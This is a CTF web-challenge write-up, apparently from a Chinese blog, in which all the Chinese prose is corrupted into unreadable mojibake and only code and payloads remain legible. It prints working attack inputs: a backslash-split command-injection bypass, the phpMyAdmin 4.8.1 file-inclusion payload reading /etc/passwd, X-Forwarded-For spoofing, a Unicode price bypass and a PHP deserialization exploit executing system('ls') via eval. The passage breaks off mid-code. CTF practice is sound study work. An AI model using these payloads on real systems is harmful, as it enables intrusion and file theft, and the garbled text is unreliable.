<p>æˆ‘ä»¬åªæœ‰ä¼ <code>?b=|\\\\</code>æ‰ä¼š<code>echo</code>æ£€æµ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»å¯ä»¥åˆ©ç”¨<code>\</code>è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œæ¯”å¦‚<code>l\s</code>ï¼Œ<code>l\s%20/</code>,<code>c\at%20fl\ag</code>ç­‰ã€‚</p>
<p>åœ¨burpä¸­å¦‚æœä½¿ç”¨ç©ºæ ¼ä¼šè¢«è¯†åˆ«ä¸ºå…¶ä»–çš„å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œç©ºæ ¼ç”¨<code>%20</code>æ›¿æ¢ã€‚</p>
<p>ç»¼ä¸Šï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå¾—åˆ°flagã€‚</p>
<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><img src="/img/db1.png" srcset="/img/loading.gif" lazyload alt="db1"></p>
<p>???</p>
<p>ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°<code>robots.txt</code>è¿˜æœ‰<code>/phpmyadmin/</code>ï¼Œçœ‹çœ‹éƒ½æœ‰å•¥ï¼š</p>
<p><code>robots.txt</code>æç¤º<code>phpinfo.php</code>ï¼Œ<code>/phpmyadmin/</code>ä¸ç™»å½•å¯ä»¥ç›´æ¥è®¿é—®æ•°æ®åº“ç®¡ç†ç•Œé¢ï¼š</p>
<p><img src="/img/db2.png" srcset="/img/loading.gif" lazyload alt="db2"></p>
<p>åé¢å°±æ— å¤„ä¸‹æ‰‹äº†ã€‚ã€‚å»ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹<code>wp</code>ï¼Œè¿™é¢˜è€ƒçš„æ˜¯<code>phpmyadmin4.8.1</code>ç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´:<code>include $_REQUEST[&#39;target&#39;];</code></p>
<p>ç›´æ¥åˆ©ç”¨ç°æˆçš„<code>payload</code>:<code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code>ï¼Œå‘ç°å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚åé¢å†ç¿»ç¿»<code>flag</code>çš„ä½ç½®å°±è¡Œäº†ã€‚</p>
<p><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code></p>
<p><code>flag&#123;14b071f4-a712-4a14-b3ce-d6bc07df4506&#125;</code></p>
<p>ä¸è¿‡æˆ‘çœ‹æ–‡ç« ä¸­éƒ½å†™äº†<code>$_REQUEST[&#39;target&#39;]</code>ï¼Œä½†å°è¯•<code>POST</code>æäº¤æ‹¿ä¸åˆ°ç»“æœã€‚è€Œä¸”åœ¨<code>?target</code>å‰åŠ ä¸ª<code>/</code>å°±ç™½å±äº†ã€‚ã€‚ä¸è¿‡å³é”®çœ‹æºç è¿˜æ˜¯èƒ½çœ‹åˆ°å›æ˜¾ï¼Œä¸çŸ¥é“å’‹å›äº‹ã€‚</p>
<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>è¿›ç¯å¢ƒå‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p>
<p><img src="/img/flagpy1.png" srcset="/img/loading.gif" lazyload alt="flagpy1"></p>
<p>çœ‹ä¸‹æºç ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>  hash = <span class="hljs-title function_">hex_md5</span>(code);<br>  <span class="hljs-keyword">return</span> hash;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> code = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;vcode&quot;</span>).<span class="hljs-property">value</span>;<span class="hljs-comment">//è·å–ç”¨æˆ·çš„è¾“å…¥</span><br>  <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">hex_md5</span>(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;</span>);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;./flag.php&quot;</span><span class="hljs-comment">//é‡å®šå‘åˆ°å½“å‰ç›®å½•ä¸‹çš„flag.php</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æˆæƒç &quot;</span>);<br>  &#125;<br>  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>çœ‹å®Œæƒ³äº†ä¸€ä¸‹ï¼Œç›´æ¥å»<code>flag.php</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p>
<p><code>http://node4.buuoj.cn:25037/flag.php</code></p>
<p><img src="/img/flagpy2.png" srcset="/img/loading.gif" lazyload alt="flagpy2"></p>
<p>æç¤ºä¿å­˜äº†è´­ä¹°è€…çš„IPï¼Œå¯ä»¥åˆ©ç”¨<code>XFF</code>ä¼ªé€ ã€‚<code>é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag</code>ï¼Œç›´æ¥<code>XFF 127.0.0.1</code>è¯•è¯•ï¼Ÿ</p>
<p><img src="/img/flagpy3.png" srcset="/img/loading.gif" lazyload alt="flagpy3"></p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>é¢˜ç›®æç¤º<code>unicode</code>å’Œ<code>python</code></p>
<p>äº†è§£äº†ä¸‹<code>unicode</code>ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Unicode</span>æ˜¯ä¸€ç§å­—ç¬¦ç¼–ç æ ‡å‡†ï¼Œç”¨äºè¡¨ç¤ºæ–‡æœ¬ä¸­çš„å­—ç¬¦ã€‚å®ƒä¸ºä¸–ç•Œä¸Šå‡ ä¹æ‰€æœ‰çš„å­—ç¬¦éƒ½åˆ†é…äº†ä¸€ä¸ªå”¯ä¸€çš„æ•°å­—æ ‡è¯†ï¼Œè¿™ä¸ªæ ‡è¯†è¢«ç§°ä¸º<span class="hljs-string">&quot;ç ç‚¹&quot;</span>ã€‚Unicodeçš„ç›®æ ‡æ˜¯ä¸ºå…¨çƒèŒƒå›´å†…çš„æ‰€æœ‰å­—ç¬¦æä¾›ä¸€ä¸ªç»Ÿä¸€çš„ç¼–ç æ–¹æ¡ˆï¼Œä»¥è§£å†³ä¸åŒå›½å®¶å’Œåœ°åŒºä½¿ç”¨ä¸åŒå­—ç¬¦ç¼–ç çš„é—®é¢˜ã€‚<br><br><span class="hljs-attribute">Unicode</span>ä½¿ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæ¯ä¸ªå­—ç¬¦çš„ç ç‚¹ï¼Œä¾‹å¦‚å­—æ¯<span class="hljs-string">&quot;A&quot;</span>çš„ç ç‚¹æ˜¯U+<span class="hljs-number">0041</span>ï¼Œæ±‰å­—<span class="hljs-string">&quot;ä¸­&quot;</span>çš„ç ç‚¹æ˜¯U+<span class="hljs-number">4</span>E2Dã€‚Unicodeå®šä¹‰äº†è¶…è¿‡<span class="hljs-number">130</span>,<span class="hljs-number">000</span>ä¸ªç ç‚¹ï¼Œå…¶ä¸­åŒ…æ‹¬å„ç§è¯­è¨€çš„å­—ç¬¦ã€æ ‡ç‚¹ç¬¦å·ã€ç¬¦å·ã€è¡¨æƒ…ç¬¦å·ç­‰ã€‚<br></code></pre></td></tr></table></figure>



<p><img src="/img/us1.png" srcset="/img/loading.gif" lazyload alt="us1"></p>
<p>è¯•äº†è¯•è´­ä¹°å‰ä¸‰ç§éƒ½æç¤ºï¼š</p>
<p><img src="/img/unishop2.png" srcset="/img/loading.gif" lazyload alt="unishop2"></p>
<p>ä¹°æœ€åä¸€ä¸ªä¼šæ˜¾ç¤º:<code>Only one char(?) allowed!</code>ï¼Œæ„æ€æ˜¯è¿™ä¸ª<code>Price</code>åªèƒ½å¡«ä¸€ä¸ªå­—ç¬¦ï¼Ÿæºç é‡Œé¢æœ‰ä¸‹é¢è¿™æ®µæç¤ºï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">meta charset=&quot;utf-8&quot;&gt;<span class="hljs-comment">&lt;!--Ah,really important,seriously. --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Unicorn shop<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Don&#x27;t be frustrated by the same view,we&#x27;ve changed the challenge content.--&gt;</span><br></code></pre></td></tr></table></figure>

<p>å»ç½‘ä¸Šæ‰¾äº†ä¸‹wpï¼Œå’Œæç¤ºçš„<code>Unicode</code>æœ‰å…³ï¼šå…ˆæŠŠ<code>Item ID</code>å’Œ<code>Price</code>éƒ½æ”¾ç©ºï¼Œçœ‹çœ‹æŠ¥é”™ä¿¡æ¯ï¼š</p>
<p><img src="/img/unishop3.png" srcset="/img/loading.gif" lazyload alt="unishop3"></p>
<p>å¯ä»¥å‘ç°ä»–ç”¨äº†<code>unicodedata.numeric()</code>å‡½æ•°å»å¤„ç†è¿™ä¸ª<code>price</code>ï¼Œè¿™ä¸œè¥¿ä¼šè·å– Unicode å­—ç¬¦çš„æ•°å€¼è¡¨ç¤ºï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; import unicodedata<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-number">1.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;11&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-number">3.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;33&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;ğ„£&#x27;</span>)<br><span class="hljs-number">2000.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;ä¸‡&#x27;</span>)<br><span class="hljs-number">10000.0</span><br></code></pre></td></tr></table></figure>



<p>ç„¶ååˆ©ç”¨è¿™ä¸ªç½‘ç«™<code>https://www.compart.com/en/unicode</code>æ‰¾<code>numeric value</code>å¤§äº<code>1337</code>çš„å°±è¡Œ</p>
<p><img src="/img/unishop4.png" srcset="/img/loading.gif" lazyload alt="unishop4"></p>
<p>ç›´æ¥æŠŠç›®æ ‡ç¬¦å·å¤åˆ¶ç²˜è´´åˆ°<code>Price</code>ä»·æ ¼é‡Œå°±å¥½äº†ã€‚</p>
<p>è¡¥å……ï¼šè¿™é¢˜æºç é‡Œæœ‰æ®µ<code>price = urlib.unquote(price).decode(&#39;utf-8&#39;)</code>ï¼Œå³å…ˆæŠŠè¾“å…¥<code>url</code>è§£ç åå†ç»è¿‡<code>utf-8</code>ç¼–ç èµ‹å€¼ç»™<code>price</code>ï¼Œç„¶åç”¨<code>unicodedata.numeric()</code>å¤„ç†<code>price</code>ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡å…ˆæ‰¾ç›®æ ‡å­—ç¬¦çš„<code>utf-8</code>ç¼–ç ï¼ŒæŠŠå®ƒè½¬æ¢æˆå¯¹åº”çš„<code>url</code>å½¢å¼(æŠŠ<code>0x</code>æ¢æˆ<code>%</code>å°±è¡Œï¼Œå†å»æ‰ç©ºæ ¼)</p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap-è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap-è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap(è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾)"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap(è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾)</h2><p><img src="/img/nmap1.png" srcset="/img/loading.gif" lazyload alt="nmap1"></p>
<p>ä¸€ä¸ªç«¯å£æ‰«æç½‘ç«™ï¼Œåˆæ­¥çŒœæµ‹å­˜åœ¨<code>RCE</code>æˆ–è€…æ–‡ä»¶åŒ…å«ã€‚</p>
<p>å…ˆçœ‹æºç é‡Œæœ‰å•¥ï¼š<code>&lt;!-- flag is in /flag --&gt;</code></p>
<p>å—¯ï¼Œé‚£åº”è¯¥æ˜¯è¦<code>RCE</code>äº†</p>
<p>éšä¾¿è¾“ä¸ª<code>127.0.0.1</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p>
<p><img src="/img/namp2.png" srcset="/img/loading.gif" lazyload alt="namp2"></p>
<p>æä¾›äº†ä¸€äº›ç«¯å£ä¿¡æ¯ï¼Œè¿™ä¸ª<code>URL</code>å€¼å¾—æ³¨æ„ï¼š</p>
<p><code>/result.php?f=f7909</code></p>
<p><code>to index</code>å°±æ˜¯è¿”å›é¦–é¡µï¼Œ<code>to list</code>æ˜¯è¿™ä¹ˆä¸ªç•Œé¢ï¼š</p>
<p><img src="/img/nmap3.png" srcset="/img/loading.gif" lazyload alt="nmap3"></p>
<p><code>File</code>é‚£ä¸€æ å°±æ˜¯<code>result.php</code>åº•ä¸‹çš„<code>f</code>å‚æ•°ï¼Œå°è¯•äº†å…­æ¬¡å‘ç°æ–‡ä»¶ååº”è¯¥äº”å…­ä½åå…­è¿›åˆ¶çš„éšæœºæ•°ã€‚ä»–è¿™ä¸œè¥¿çš„è¿è¡Œè¿‡ç¨‹å¤§æ¦‚å°±æ˜¯æ‰«æç›®æ ‡<code>IP</code>çš„ç«¯å£ï¼Œç„¶åç»™ç»“æœäº”ä½åå…­è¿›åˆ¶éšæœºæ•°çš„æ–‡ä»¶åï¼Œå­˜å‚¨èµ·æ¥å¦‚æœæƒ³è¯»å–åˆ©ç”¨<code>result.php</code>è¿›è¡Œäº†æ–‡ä»¶åŒ…å«ã€‚</p>
<p>ä¸è¿‡ç»“æœä¸­å­˜åœ¨ä¸€ä¸ªè­¦å‘Šï¼ŒæŠ“åŒ…çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p>
<p><img src="/img/nmap4.png" srcset="/img/loading.gif" lazyload alt="nmap4"></p>
<p>é¦–å…ˆï¼Œè¾“å…¥<code>IP</code>åä¼šè¿›è¡Œ302é‡å®šå‘ã€‚</p>
<p>å¦‚æœéšä¾¿æ›´æ”¹<code>f</code>çš„å€¼å‘¢ï¼Ÿä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š</p>
<p><img src="/img/nmap5.png" srcset="/img/loading.gif" lazyload alt="nmap5"></p>
<p>  <code>simplexml_load_file()</code>ä¼šæŠŠæŠŠXML æ–‡æ¡£è½½å…¥å¯¹è±¡ä¸­ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æŠŠç»“æœä»¥XMLæ–‡ä»¶çš„å½¢å¼å­˜å‚¨ã€‚</p>
<p><code>127.0.0.1;ls</code>æç¤º<code>Host maybe down</code>ï¼Œæ¢æˆ<code>127.0.0.1 ;</code>å‘ç°ä¼šç»™<code>;</code>å‰åŠ ä¸€ä¸ª<code>\</code>è¿›è¡Œè½¬ä¹‰å˜æˆ<code>127.0.0.1 \;</code>ï¼Œä½†å¦‚æœæ²¡æœ‰è¿™ä¸ªç©ºæ ¼ä¼šç›´æ¥æŠ¥é”™<code>host maybe down</code></p>
<p>åé¢æ£é¼“åŠå¤©ä¸çŸ¥é“æ€ä¹ˆå¼„äº†ï¼Œæ‰¾äº†<code>wp</code>å‘ç°æ˜¯è‡ªå·±æ€è·¯é”™äº†ï¼Œè¿™é¢˜è€ƒçš„æ˜¯<code>Nmap</code>çš„ä¸€äº›ç”¨æ³•ã€‚</p>
<p>è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾ã€‚ã€‚ä¸€çœ‹è¿™ä¸¤ä¸ª<code>escape</code>å‡½æ•°æˆ‘å°±å¤´ç–¼</p>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œå°è¯•å³é”®çœ‹æºç æ²¡å•¥ååº”ï¼Œç›´æ¥åœ¨URLåŠ <code>view-source:</code></p>
<p><img src="/img/real1.png" srcset="/img/loading.gif" lazyload alt="real1"></p>
<p>å‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œç›´æ¥è®¿é—®ï¼š<code>./time.php?source</code>(æœ¬æ¥è¿˜æƒ³æ‹¿dirsearchæ‰«æ¥ç€ï¼Œçœ‹æ¥æ²¡å¿…è¦äº†)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//ç›¸å½“äºè°ƒç”¨äº†bè¿™ä¸ªå‡½æ•°è€Œä¸”å‚æ•°æ˜¯aï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ‰§è¡Œå‘½ä»¤</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))  <span class="hljs-comment">//è‹¥sourceè¢«èµ‹å€¼ï¼Œé«˜äº®æºç å¹¶die(0)ç»“æŸã€‚åé¢è¦ç»™dataèµ‹å€¼</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<span class="hljs-comment">//ååºåˆ—åŒ–GETä¼ çš„data</span><br><br><br><span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">04</span> <span class="hljs-number">12</span>:<span class="hljs-number">27</span>:<span class="hljs-number">15</span><br><br><br><br></code></pre></td></tr></table></figure>

<p>ç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼Œç›´æ¥æ„é€ æˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‘½ä»¤å°±è¡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;eval&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¸è¿‡æ²¡æœ‰è¿è¡Œï¼Ÿåé¢æ¢äº†å…¶å®ƒçš„å‘½ä»¤ä¹Ÿæ˜¯æ²¡æœ‰å›æ˜¾ã€‚æ„Ÿè§‰æ˜¯è¢«è¿‡æ»¤äº†(å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤š)ï¼Œä½†ä¹Ÿæƒ³ä¸åˆ°å…¶å®ƒæ€è·¯ï¼Œå»çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„wpå‘ç°è¦ç”¨<code>assert</code>è¿™ä¸ªå‡½æ•°ï¼Œæ­£å¥½å€Ÿè¿™ä¸ªæœºä¼šæ¢³ç†ä¸€ä¸‹<code>RCE</code>ä¸­å¸¸ç”¨çš„å‡ ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œè¿˜æœ‰ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼š</p>
<p>æˆ‘ä¸ªäººè®¤ä¸ºæœ€å¸¸è§çš„è‚¯å®šæ˜¯<code>eval</code>å’Œ<code>system</code>ï¼Œå…ˆè¯´ä¸‹å®ƒä¿©ä¹‹é—´æœ€å¤§çš„å·®åˆ«(ä¸ªäººè§‚ç‚¹)ï¼š</p>
<p><strong>evalç±»å‹å‡½æ•°æ˜¯ä»£ç æ‰§è¡Œè€Œä¸æ˜¯å‘½ä»¤æ‰§è¡Œ</strong></p>
<p><strong>systemç±»å‹å‡½æ•°æ˜¯å‘½ä»¤æ‰§è¡Œè€Œä¸æ˜¯ä»£ç æ‰§è¡Œ</strong>ï¼Œä¸¾å‡ ä¸ªæ —å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);    <span class="hljs-comment">//2,æ³¨æ„æœ«å°¾çš„åˆ†å·</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);  <span class="hljs-comment">//1+1;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$num</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$a = <span class="hljs-subst">$num</span>;&quot;</span>);   <span class="hljs-comment">//åªæœ‰è¿™ä¸ªå¹¶æ— ä»»ä½•å›æ˜¾ï¼Œå¯é€šè¿‡echoæˆ–var_dumpè·å¾—å›æ˜¾</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;\$b = <span class="hljs-subst">$num</span>;&quot;</span>);   <br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//æ˜¾ç¤º1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<span 